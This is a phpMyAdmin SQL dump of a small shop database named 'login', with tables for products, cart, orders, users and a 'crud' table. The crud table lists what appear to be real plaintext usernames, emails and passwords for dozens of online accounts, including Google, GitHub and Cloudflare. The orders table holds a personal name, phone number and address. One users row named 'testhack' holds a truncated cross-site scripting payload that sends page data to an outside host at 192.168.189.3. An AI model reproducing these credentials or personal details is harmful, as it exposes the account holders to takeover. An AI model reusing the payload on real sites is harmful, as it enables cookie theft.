-- phpMyAdmin SQL Dump
-- version 5.0.2
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Aug 20, 2020 at 04:04 PM
-- Server version: 10.4.13-MariaDB
-- PHP Version: 7.4.8

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `login`
--

-- --------------------------------------------------------

--
-- Table structure for table `cart`
--

CREATE TABLE `cart` (
  `id` int(11) NOT NULL,
  `product_name` varchar(100) NOT NULL,
  `product_price` varchar(50) NOT NULL,
  `product_image` varchar(255) NOT NULL,
  `qty` int(10) NOT NULL,
  `total_price` varchar(100) NOT NULL,
  `product_code` varchar(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `cart`
--

INSERT INTO `cart` (`id`, `product_name`, `product_price`, `product_image`, `qty`, `total_price`, `product_code`) VALUES
(32, 'video-2', '950000', 'image/2.mp4', 1, '950000', 'p1001'),
(33, 'video-3', '200000', 'image/3.mp4', 1, '200000', 'p1002'),
(34, 'video-4', '200000', 'image/4.mp4', 1, '200000', 'p1003');

-- --------------------------------------------------------

--
-- Table structure for table `crud`
--

CREATE TABLE `crud` (
  `id` int(11) NOT NULL,
  `web` varchar(255) NOT NULL,
  `name` varchar(100) NOT NULL,
  `email` varchar(100) NOT NULL,
  `password` varchar(255) NOT NULL,
  `photo` varchar(255) NOT NULL,
  `date` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `crud`
--

INSERT INTO `crud` (`id`, `web`, `name`, `email`, `password`, `photo`, `date`) VALUES
(6, 'https://account.garena.com/security/mobile/save', 'ptn1411', '', 'ptn14112', 'uploads/J2TEAM-2.jpg', '0000-00-00'),
(7, 'https://account.jetbrains.com/registration', 'ptn141122', '', 'ptn141122@', 'uploads/J2TEAM-21.jpg', '0000-00-00'),
(8, 'https://account.samsung.com/accounts/v1/FMM2/signInGate', 'zvw180ptn1411@gmail.com', '', 'zvw180ptn', 'uploads/J2TEAM-20.jpg', '0000-00-00'),
(9, 'https://account.termius.com/sign-up-student/', ' namptfx04543@funix.edu.vn', 'namptfx04543@funix.edu.vn', 'namptfx04543@funix.edu.vn', 'uploads/J2TEAM-38.jpg', '0000-00-00'),
(10, 'https://account.ubisoft.com/en-GB/login/change-password', '', '', 'Kimduyen1309@1', 'uploads/', '0000-00-00'),
(11, 'https://accounts.google.com/signin/v2/challenge/pwd', 'nam@zvw180.website', 'nam@zvw180.website', 'zvw180ptn', 'uploads/', '0000-00-00'),
(12, 'https://accounts.google.com/signin/v2/challenge/pwd', '11142000zvw@gmail.com', '11142000zvw@gmail.com', 'ptn141122', 'uploads/', '0000-00-00'),
(13, 'https://accounts.google.com/signin/v2/challenge/pwd', 'namptfx04543@funix.edu.vn', 'namptfx04543@funix.edu.vn', 'phamthanhnam1', 'uploads/', '0000-00-00'),
(14, 'https://accounts.google.com/signin/v2/challenge/pwd', 'phamthanhnamdev@gmail.com', 'phamthanhnamdev@gmail.com', '3fa96cb18754f267', 'uploads/', '0000-00-00'),
(15, 'https://accusonus.com/lp/celebrate-video-creation-2020', 'zvw180ptn1411@gmail.com', 'zvw180ptn1411@gmail.com', 'zvw180ptn', 'uploads/', '0000-00-00'),
(16, 'https://analytics.katalon.com/login', 'zvw180ptn1411@gmail.com', 'zvw180ptn1411@gmail.com', 'zvw180ptn', 'uploads/', '0000-00-00'),
(17, 'https://app.lhu.edu.vn/', '119000438', '', 'phamthanhnam1', 'uploads/', '0000-00-00'),
(18, 'https://app.pomodoneapp.com/', 'namptfx04543@funix.edu.vn', 'namptfx04543@funix.edu.vn', 'ptn141122@', 'uploads/', '0000-00-00'),
(19, 'https://auth.riotgames.com/login', ' ptndev', '', '3c838745ee7c69d1', 'uploads/', '0000-00-00'),
(20, 'https://cloud.geny.io/', 'zvw180ptn1411@gmail.com', '', 'zvw180ptn1411', 'uploads/', '0000-00-00'),
(21, 'https://codepen.io/accounts/signup/user/free', 'zvw180ptn1411@gmail.com', 'zvw180ptn1411@gmail.com', '4aRT/GBC+s7gAKS', 'uploads/', '0000-00-00'),
(22, 'https://dash.cloudflare.com/sign-up', '11142000zvw@gmail.com', '11142000zvw@gmail.com', 'ptn141122@', 'uploads/', '0000-00-00'),
(23, 'https://dashboard.tawk.to/signup', '11142000zvw@gmail.com', '11142000zvw@gmail.com', 'Kimduyen1309@', 'uploads/', '0000-00-00'),
(24, 'https://educationhost.co.uk/whmcs/clientarea.php', 'zvw180ptn1411@gmail.com', '', '0346038772@a', 'uploads/', '0000-00-00'),
(25, 'https://fontawesome.com/sessions/sign-in', 'zvw180ptn1411@gmail.com', '', 'ptn141122', 'uploads/', '0000-00-00'),
(26, 'https://formspree.io/register', '11142000zvw@gmail.com', '', '1411223', 'uploads/', '0000-00-00'),
(27, 'https://formspree.io/register', 'zvw180ptn1411@gmail.com', '', 'zvw180ptn', 'uploads/', '0000-00-00'),
(28, 'https://github.com/join', 'namptfx04543', '', 'ptn141122@', 'uploads/', '0000-00-00'),
(29, 'https://github.com/login', 'zvw180ptn1411@gmail.com', '', 'zvw180ptn', 'uploads/', '0000-00-00'),
(30, 'https://github.com/session', 'zvw180', '', 'ptn141122@', 'uploads/', '0000-00-00'),
(31, 'https://gitlab.com/-/trial_registrations/new', 'ptn1411', '', 'zbw180ptn', 'uploads/', '0000-00-00'),
(32, 'https://go.fast.io/signup', '11142000zvw@gmail.com', '11142000zvw@gmail.com', 'ptn141122@', 'uploads/', '0000-00-00'),
(33, 'https://go.fast.io/signup/', 'zvw180ptn1411@gmail.com', 'zvw180ptn1411@gmail.com', 'zvw180ptn', 'uploads/', '0000-00-00'),
(34, 'https://grabify.link/login', 'ptn1411', '', 'ptn141122', 'uploads/', '0000-00-00'),
(35, 'https://hub.upcloud.com/login', 'zvw180', '', 'Zvw180ptn@', 'uploads/', '0000-00-00'),
(36, 'https://humanbenchmark.com/signup', 'ptn1411', '', 'ptn141122', 'uploads/', '0000-00-00'),
(37, 'https://id.fpt.ai/accounts/signup/', 'zvw180ptn1411@gmail.com', 'zvw180ptn1411@gmail.com', 'kuUgTzp3Tkz4Wf.7', 'uploads/', '0000-00-00'),
(38, 'https://login.arduino.cc/login', 'ptn1411', '', 'ptn1411', 'uploads/', '0000-00-00'),
(39, 'https://profile.oracle.com/myprofile/account/create-account.jspx', 'zvw180ptn1411@gmail.com', 'zvw180ptn1411@gmail.com', 'SV&WgLA5pS-/DFK', 'uploads/', '0000-00-00'),
(40, 'https://www.fshare.vn/site/login', 'tamgiacmach1508@gmail.com', '', 'tamgiacmach1908', 'uploads/', '0000-00-00'),
(41, 'https://www.namecheap.com/myaccount/login-signup/', ' ptn141122', '', 'ptn141122', 'uploads/', '0000-00-00'),
(42, 'https://www.udemy.com/cart/', 'zvw180ptn1411@gmail.com', '', ':/x5d\'\"W%Cy#3xa', 'uploads/', '0000-00-00');

-- --------------------------------------------------------

--
-- Table structure for table `orders`
--

CREATE TABLE `orders` (
  `id` int(11) NOT NULL,
  `name` varchar(100) NOT NULL,
  `email` varchar(100) NOT NULL,
  `phone` varchar(10) NOT NULL,
  `address` varchar(255) NOT NULL,
  `pmode` varchar(50) NOT NULL,
  `products` varchar(255) NOT NULL,
  `amount_paid` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `orders`
--

INSERT INTO `orders` (`id`, `name`, `email`, `phone`, `address`, `pmode`, `products`, `amount_paid`) VALUES
(1, 'nam thanh pham', 'zvw180ptn1411@gmail.com', '0346038772', 'buu long', 'cod', 'video-2(1), video-3(1), video-4(1)', '1350000'),
(2, 'nam thanh pham', 'zvw180ptn1411@gmail.com', '0346038772', 'buu long', 'netbanking', 'video-2(1), video-3(1), video-4(1)', '1350000');

-- --------------------------------------------------------

--
-- Table structure for table `product`
--

CREATE TABLE `product` (
  `id` int(11) NOT NULL,
  `product_name` varchar(100) NOT NULL,
  `product_price` varchar(50) NOT NULL,
  `product_image` varchar(255) NOT NULL,
  `product_code` varchar(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `product`
--

INSERT INTO `product` (`id`, `product_name`, `product_price`, `product_image`, `product_code`) VALUES
(1, 'video-1', '100000', 'image/1.mp4', 'p1000'),
(2, 'video-2', '950000', 'image/2.mp4', 'p1001'),
(3, 'video-3', '200000', 'image/3.mp4', 'p1002'),
(4, 'video-4', '200000', 'image/4.mp4', 'p1003'),
(5, 'video-5', '500000', 'image/5.mp4', 'p1004'),
(6, 'video-6', '600000', 'image/6.mp4', 'p1005'),
(7, 'video-7', '650000', 'image/7.mp4', 'p1006'),
(8, 'video-8', '700000', 'image/8.mp4', 'p1007');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `name` varchar(100) NOT NULL,
  `username` varchar(100) NOT NULL,
  `email` varchar(100) NOT NULL,
  `pass` varchar(100) NOT NULL,
  `created` date NOT NULL,
  `quyen` varchar(2) NOT NULL,
  `token` varchar(100) NOT NULL,
  `tokenExpire` timestamp(6) NOT NULL DEFAULT current_timestamp(6) ON UPDATE current_timestamp(6)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `name`, `username`, `email`, `pass`, `created`, `quyen`, `token`, `tokenExpire`) VALUES
(19, 'nam thanh pham', 'admin', 'zvw180ptn1411@gmail.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2020-08-12', '2', '951602', '2020-08-17 07:50:15.000000'),
(26, 'nam pham', 'wordpress', 'namptfx04543@funix.edu.vn', 'b1909932aac1c5510c044de0cb8c0f3ef049a250', '2020-08-17', '1', '', '2020-08-17 07:31:24.288234'),
(27, 'nam pham', 'minhduy', 'naunix@edu.vn', '6de938af74fd3d355fb992053281419463ca5346', '2020-08-17', '1', '', '2020-08-17 07:31:51.007302'),
(28, 'img]javascript: Document.write(`&amp;#x3cimg src=http://192.168.189.3/test/cok.php? docs=`+escape(do', 'testhack', 'zptn1411@gmail.com', '20eabe5d64b0e216796e834f52d61fd0b70332fc', '2020-08-17', '1', '', '2020-08-17 13:49:17.347067');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `cart`
--
ALTER TABLE `cart`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `crud`
--
ALTER TABLE `crud`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `orders`
--
ALTER TABLE `orders`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `product`
--
ALTER TABLE `product`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `cart`
--
ALTER TABLE `cart`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;

--
-- AUTO_INCREMENT for table `crud`
--
ALTER TABLE `crud`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=44;

--
-- AUTO_INCREMENT for table `orders`
--
ALTER TABLE `orders`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `product`
--
ALTER TABLE `product`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=29;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
